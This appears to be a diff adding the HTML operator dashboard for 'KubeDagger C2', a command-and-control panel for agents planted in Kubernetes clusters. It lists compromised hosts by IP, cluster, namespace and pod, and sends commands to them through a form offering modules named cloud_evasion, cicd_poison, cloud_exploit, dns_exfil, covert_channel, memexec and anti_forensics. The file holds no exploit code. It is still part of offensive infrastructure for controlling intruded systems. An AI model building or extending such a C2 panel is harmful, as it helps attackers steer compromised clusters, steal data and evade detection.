@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KubeDagger C2</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; min-height: 100vh; }
+        .header { background: #111; border-bottom: 1px solid #00ff41; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; }
+        .header h1 { font-size: 20px; letter-spacing: 2px; }
+        .header .status { color: #00ff41; font-size: 12px; }
+        .container { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; padding: 16px; height: calc(100vh - 60px); }
+        .panel { background: #111; border: 1px solid #333; border-radius: 4px; overflow: hidden; display: flex; flex-direction: column; }
+        .panel-header { background: #1a1a1a; padding: 8px 16px; border-bottom: 1px solid #333; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; color: #888; }
+        .panel-body { padding: 12px; overflow-y: auto; flex: 1; }
+        .agent-card { background: #1a1a1a; border: 1px solid #333; border-radius: 4px; padding: 12px; margin-bottom: 8px; }
+        .agent-card.active { border-color: #00ff41; }
+        .agent-card.stale { border-color: #ff4141; opacity: 0.7; }
+        .agent-id { font-weight: bold; color: #00ff41; font-size: 14px; }
+        .agent-meta { color: #888; font-size: 11px; margin-top: 4px; }
+        .agent-meta span { margin-right: 12px; }
+        .cmd-row { background: #1a1a1a; border: 1px solid #333; border-radius: 4px; padding: 10px; margin-bottom: 6px; font-size: 12px; }
+        .cmd-row .cmd-status { display: inline-block; padding: 2px 6px; border-radius: 3px; font-size: 10px; margin-left: 8px; }
+        .cmd-row .cmd-status.pending { background: #444; color: #fff; }
+        .cmd-row .cmd-status.completed { background: #004400; color: #00ff41; }
+        .cmd-row .cmd-status.failed { background: #440000; color: #ff4141; }
+        .cmd-row .cmd-status.dispatched { background: #443300; color: #ffaa00; }
+        .cmd-output { margin-top: 8px; background: #0a0a0a; padding: 8px; border-radius: 3px; white-space: pre-wrap; font-size: 11px; color: #ccc; max-height: 150px; overflow-y: auto; }
+        .form-group { margin-bottom: 12px; }
+        .form-group label { display: block; font-size: 11px; color: #888; margin-bottom: 4px; }
+        .form-group select, .form-group input { width: 100%; background: #1a1a1a; border: 1px solid #333; color: #00ff41; padding: 8px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 12px; }
+        .form-group select:focus, .form-group input:focus { outline: none; border-color: #00ff41; }
+        .btn { background: #00ff41; color: #0a0a0a; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-family: 'Courier New', monospace; font-weight: bold; font-size: 12px; }
+        .btn:hover { background: #00cc33; }
+        .full-width { grid-column: 1 / -1; }
+        @media (max-width: 768px) { .container { grid-template-columns: 1fr; } }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>KUBEDAGGER C2</h1>
+        <div class="status">{{len .Agents}} agents | {{len .Commands}} commands</div>
+    </div>
+    <div class="container">
+        <div class="panel">
+            <div class="panel-header">Active Agents</div>
+            <div class="panel-body" id="agents-list">
+                {{range .Agents}}
+                <div class="agent-card {{if eq .Status "active"}}active{{else}}stale{{end}}">
+                    <div class="agent-id">{{.ID}}</div>
+                    <div class="agent-meta">
+                        <span>{{.Hostname}}</span>
+                        <span>{{.IP}}</span>
+                        <span>{{.OS}}/{{.Arch}}</span>
+                    </div>
+                    <div class="agent-meta">
+                        <span>cluster: {{.Cluster}}</span>
+                        <span>ns: {{.Namespace}}</span>
+                        <span>pod: {{.Pod}}</span>
+                    </div>
+                    <div class="agent-meta">
+                        <span>last seen: {{.LastSeen.Format "15:04:05"}}</span>
+                        <span>modules: {{len .Modules}}</span>
+                    </div>
+                </div>
+                {{else}}
+                <div style="color: #888; text-align: center; padding: 24px;">No agents connected</div>
+                {{end}}
+            </div>
+        </div>
+        <div class="panel">
+            <div class="panel-header">Issue Command</div>
+            <div class="panel-body">
+                <form id="cmd-form" onsubmit="sendCommand(event)">
+                    <div class="form-group">
+                        <label>Target Agent</label>
+                        <select id="cmd-agent">
+                            <option value="*">All Agents</option>
+                            {{range .Agents}}
+                            <option value="{{.ID}}">{{.ID}} ({{.Hostname}})</option>
+                            {{end}}
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Module</label>
+                        <select id="cmd-module">
+                            <option value="cloud_evasion">cloud_evasion</option>
+                            <option value="service_mesh">service_mesh</option>
+                            <option value="cicd_poison">cicd_poison</option>
+                            <option value="cloud_exploit">cloud_exploit</option>
+                            <option value="multi_cluster">multi_cluster</option>
+                            <option value="k8s_discovery">k8s_discovery</option>
+                            <option value="dns_exfil">dns_exfil</option>
+                            <option value="covert_channel">covert_channel</option>
+                            <option value="polymorph">polymorph</option>
+                            <option value="k8s_c2">k8s_c2</option>
+                            <option value="memexec">memexec</option>
+                            <option value="webhook_deploy">webhook_deploy</option>
+                            <option value="anti_forensics">anti_forensics</option>
+                            <option value="autonomy">autonomy</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Action</label>
+                        <input type="text" id="cmd-action" placeholder="detect, exploit, list..." value="detect">
+                    </div>
+                    <div class="form-group">
+                        <label>Extra Args (key=value, one per line)</label>
+                        <input type="text" id="cmd-args" placeholder="namespace=default">
+                    </div>
+                    <button type="submit" class="btn">EXECUTE</button>
+                </form>
+            </div>
+        </div>
+        <div class="panel full-width">
+            <div class="panel-header">Command History</div>
+            <div class="panel-body" id="commands-list">
+                {{range .Commands}}
+                <div class="cmd-row">
+                    <strong>{{.Module}}</strong> &rarr; {{.AgentID}}
+                    <span class="cmd-status {{.Status}}">{{.Status}}</span>
+                    <span style="color: #666; font-size: 10px; margin-left: 8px;">{{.CreatedAt.Format "15:04:05"}}</span>
+                    {{if .Output}}
+                    <div class="cmd-output">{{.Output}}</div>
+                    {{end}}
+                </div>
+                {{else}}
+                <div style="color: #888; text-align: center; padding: 24px;">No commands issued</div>
+                {{end}}
+            </div>
+        </div>
+    </div>
+    <script>
+        function sendCommand(e) {
+            e.preventDefault();
+            const agentId = document.getElementById('cmd-agent').value;
+            const module = document.getElementById('cmd-module').value;
+            const action = document.getElementById('cmd-action').value;
+            const argsStr = document.getElementById('cmd-args').value;
+
+            const args = {action: action};
+            if (argsStr) {
+                argsStr.split(',').forEach(pair => {
+                    const [k, v] = pair.trim().split('=');
+                    if (k && v) args[k.trim()] = v.trim();
+                });
+            }
+
+            fetch('/api/commands/new', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({agent_id: agentId, module: module, args: args})
+            }).then(r => r.json()).then(() => location.reload());
+        }
+
+        setInterval(() => {
+            fetch('/api/agents').then(r => r.json()).then(agents => {
+                const el = document.getElementById('agents-list');
+                if (agents && agents.length > 0) {
+                    el.innerHTML = agents.map(a => `
+                        <div class="agent-card ${a.status === 'active' ? 'active' : 'stale'}">
+                            <div class="agent-id">${a.id}</div>
+                            <div class="agent-meta">
+                                <span>${a.hostname}</span>
+                                <span>${a.ip}</span>
+                                <span>${a.os}/${a.arch}</span>
+                            </div>
+                            <div class="agent-meta">
+                                <span>cluster: ${a.cluster}</span>
+                                <span>ns: ${a.namespace}</span>
+                                <span>pod: ${a.pod}</span>
+                            </div>
+                        </div>
+                    `).join('');
+                }
+            });
+        }, 5000);
+    </script>
+</body>
+</html>
